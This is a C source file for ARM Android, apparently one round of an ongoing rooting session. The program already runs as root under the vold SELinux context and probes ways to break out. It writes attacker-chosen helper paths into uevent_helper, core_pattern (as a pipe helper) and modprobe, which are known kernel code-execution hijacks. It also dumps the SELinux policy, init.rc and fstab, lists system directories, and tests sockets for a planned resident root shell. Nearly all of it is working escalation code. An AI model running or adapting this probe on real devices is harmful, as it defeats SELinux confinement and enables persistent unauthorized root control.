/* session62 root_probe2.c  (SELinux escape-surface probe, vold-domain root)
 *
 * Round 2. root_probe showed: uid 0 / full caps / u:r:vold:s0, boot+system
 * open O_RDWR, but selinuxfs enforce, /proc/sys/kernel/{hotplug,kptr_restrict,
 * modules_disabled} are EACCES. This rounds probes the classic
 * root->unconfined escalators and the policy-reload path:
 *   /sys/kernel/uevent_helper          (sysfs alias of uevent_helper)
 *   /proc/sys/kernel/core_pattern      (|helper -> root exec on coredump)
 *   /proc/sys/kernel/modprobe          (modprobe_path -> root exec on request_module)
 *   /data/security/current/*           (selinux reload_policy path)
 * plus network capability and a getdents listing of a few dirs.
 *
 * Outputs to /storage/emulated/legacy/ (rp2_*). Only transient /sys+/proc writes.
 */

#define SYS_exit        1
#define SYS_read        3
#define SYS_write       4
#define SYS_open        5
#define SYS_close       6
#define SYS_getdents64  217
#define SYS_socket      281
#define SYS_umask       60
#define SYS_clone       120

#define O_RDONLY        0
#define O_WRONLY        1
#define O_RDWR          2
#define O_CREAT         0x40
#define O_TRUNC         0x200
#define O_APPEND        0x400

static inline long sc6(long n, long a, long b, long c, long d, long e, long f)
{
    register long r0 asm("r0") = a;
    register long r1 asm("r1") = b;
    register long r2 asm("r2") = c;
    register long r3 asm("r3") = d;
    register long r4 asm("r4") = e;
    register long r5 asm("r5") = f;
    asm volatile("mov r7, %[n]\n\tsvc 0"
                 : "+r"(r0)
                 : [n] "r"(n), "r"(r1), "r"(r2), "r"(r3), "r"(r4), "r"(r5)
                 : "r7", "memory");
    return r0;
}
static void ex(long c) { sc6(SYS_exit, c, 0, 0, 0, 0, 0); for (;;) {} }

static long slen(const char *s) { long n = 0; while (s[n]) n++; return n; }
static void scpy(char *d, const char *s) { while (*s) *d++ = *s++; *d = 0; }
static void scat(char *d, const char *s) { while (*d) d++; scpy(d, s); }

static const char *OUTBASE = "/storage/emulated/legacy/";
static char logpath[128];

static void lograw(const char *msg, long n)
{
    long f = sc6(SYS_open, (long)logpath, O_WRONLY | O_CREAT | O_APPEND, 0644, 0, 0, 0);
    if (f >= 0) { sc6(SYS_write, f, (long)msg, n, 0, 0, 0); sc6(SYS_close, f, 0, 0, 0, 0, 0); }
}
static void logmsg(const char *msg) { lograw(msg, slen(msg)); }
static void loghex8(unsigned long v)
{
    char b[16]; int i = 0; b[i++] = '0'; b[i++] = 'x';
    for (int k = 0; k < 8; k++) { int d = (v >> ((7 - k) * 4)) & 0xf; b[i++] = d < 10 ? '0' + d : 'a' + d - 10; }
    b[i++] = '\n'; lograw(b, i);
}
static void kvhex(const char *tag, unsigned long v) { logmsg(tag); loghex8(v); }

static long probe_open(const char *tag, const char *path, long flags)
{
    long fd = sc6(SYS_open, (long)path, flags, 0, 0, 0, 0);
    logmsg(tag); logmsg(" open="); loghex8((unsigned long)fd);
    if (fd >= 0) sc6(SYS_close, fd, 0, 0, 0, 0, 0);
    return fd;
}

static long copy_path(const char *path, const char *outname, long max)
{
    char dst[192];
    scpy(dst, OUTBASE); scat(dst, outname);
    long fd = sc6(SYS_open, (long)path, O_RDONLY, 0, 0, 0, 0);
    if (fd < 0) return fd;
    long of = sc6(SYS_open, (long)dst, O_WRONLY | O_CREAT | O_TRUNC, 0644, 0, 0, 0);
    if (of < 0) { sc6(SYS_close, fd, 0, 0, 0, 0, 0); return of; }
    static char buf[65536];
    long total = 0, r;
    while (total < max) {
        long want = max - total; if (want > sizeof buf) want = sizeof buf;
        r = sc6(SYS_read, fd, (long)buf, want, 0, 0, 0);
        if (r <= 0) break;
        sc6(SYS_write, of, (long)buf, r, 0, 0, 0);
        total += r;
    }
    sc6(SYS_close, of, 0, 0, 0, 0, 0);
    sc6(SYS_close, fd, 0, 0, 0, 0, 0);
    return total;
}

/* open RW, optionally write payload, close. Logs open rc + write rc. */
static void try_rw(const char *tag, const char *path, const char *data)
{
    long fd = sc6(SYS_open, (long)path, O_RDWR, 0, 0, 0, 0);
    logmsg(tag); logmsg(" RWopen="); loghex8((unsigned long)fd);
    if (fd < 0) return;
    if (data) {
        long w = sc6(SYS_write, fd, (long)data, slen(data), 0, 0, 0);
        logmsg(tag); logmsg(" write="); loghex8((unsigned long)w);
    }
    sc6(SYS_close, fd, 0, 0, 0, 0, 0);
}

/* list a directory's names into an output file (getdents64) */
struct linux_dirent64 {
    unsigned long  d_ino;
    long           d_off;
    unsigned short d_reclen;
    unsigned char  d_type;
    char           d_name[];
};

static void list_dir(const char *dir, const char *outname)
{
    char dst[192];
    scpy(dst, OUTBASE); scat(dst, outname);
    long fd = sc6(SYS_open, (long)dir, 0x10000 /*O_DIRECTORY*/, 0, 0, 0, 0);
    if (fd < 0) { logmsg("listdir "); logmsg(dir); logmsg(" open="); loghex8((unsigned long)fd); return; }
    long of = sc6(SYS_open, (long)dst, O_WRONLY | O_CREAT | O_TRUNC, 0644, 0, 0, 0);
    if (of < 0) { sc6(SYS_close, fd, 0, 0, 0, 0, 0); return; }
    static char buf[8192];
    long n;
    while ((n = sc6(SYS_getdents64, fd, (long)buf, sizeof buf, 0, 0, 0)) > 0) {
        long off = 0;
        while (off < n) {
            struct linux_dirent64 *d = (struct linux_dirent64 *)(buf + off);
            sc6(SYS_write, of, (long)d->d_name, slen(d->d_name), 0, 0, 0);
            sc6(SYS_write, of, (long)"\n", 1, 0, 0, 0);
            off += d->d_reclen;
        }
    }
    sc6(SYS_close, of, 0, 0, 0, 0, 0);
    sc6(SYS_close, fd, 0, 0, 0, 0, 0);
}

void _start(void)
{
    sc6(SYS_umask, 0, 0, 0, 0, 0, 0);
    scpy(logpath, OUTBASE); scat(logpath, "rp2_log.txt");

    long pid = sc6(SYS_clone, 17, 0, 0, 0, 0, 0);
    if (pid != 0) ex(0);

    logmsg("\nsession62 root_probe2: start\n");

    /* uevent_helper: sysfs alias + sysctl */
    probe_open("sys/uevent_helper RO", "/sys/kernel/uevent_helper", O_RDONLY);
    probe_open("sys/uevent_helper RW", "/sys/kernel/uevent_helper", O_RDWR);
    try_rw("sys/uevent_helper", "/sys/kernel/uevent_helper", "/data/local/tmp/uh");
    copy_path("/sys/kernel/uevent_helper", "rp2_uevent_helper.txt", 512);

    /* core_pattern (|helper root exec on coredump) */
    copy_path("/proc/sys/kernel/core_pattern", "rp2_core_pattern.txt", 256);
    try_rw("core_pattern", "/proc/sys/kernel/core_pattern", "|/data/local/tmp/cp");

    /* modprobe_path */
    copy_path("/proc/sys/kernel/modprobe", "rp2_modprobe.txt", 256);
    try_rw("modprobe", "/proc/sys/kernel/modprobe", "/data/local/tmp/mp");

    /* selinux reload policy path */
    list_dir("/data/security", "rp2_ls_data_security.txt");
    list_dir("/data/security/current", "rp2_ls_data_security_current.txt");
    copy_path("/data/security/current/sepolicy", "rp2_cur_sepolicy.bin", 262144);
    copy_path("/data/security/current/selinux_version", "rp2_selinux_version.txt", 256);
    copy_path("/data/security/selinux_version", "rp2_selinux_version_root.txt", 256);
    probe_open("selinux/load RW", "/sys/fs/selinux/load", O_RDWR);

    /* misc config/context */
    copy_path("/fstab.qcom", "rp2_fstab_qcom.txt", 8192);
    copy_path("/init.rc", "rp2_init_rc.txt", 131072);
    list_dir("/system/xbin", "rp2_ls_system_xbin.txt");
    list_dir("/system/bin", "rp2_ls_system_bin.txt");
    list_dir("/cache", "rp2_ls_cache.txt");
    list_dir("/persist", "rp2_ls_persist.txt");
    list_dir("/", "rp2_ls_root.txt");

    /* network capability (for a resident root shell) */
    long s = sc6(SYS_socket, 2 /*AF_INET*/, 1 /*SOCK_STREAM*/, 0, 0, 0, 0);
    kvhex("socket(AF_INET,STREAM)=", (unsigned long)s);
    if (s >= 0) sc6(SYS_close, s, 0, 0, 0, 0, 0);
    s = sc6(SYS_socket, 1 /*AF_UNIX*/, 1, 0, 0, 0, 0);
    kvhex("socket(AF_UNIX,STREAM)=", (unsigned long)s);
    if (s >= 0) sc6(SYS_close, s, 0, 0, 0, 0, 0);
    s = sc6(SYS_socket, 10 /*AF_INET6*/, 1, 0, 0, 0, 0);
    kvhex("socket(AF_INET6,STREAM)=", (unsigned long)s);
    if (s >= 0) sc6(SYS_close, s, 0, 0, 0, 0, 0);

    logmsg("session62 root_probe2: done\n");
    ex(0);
}
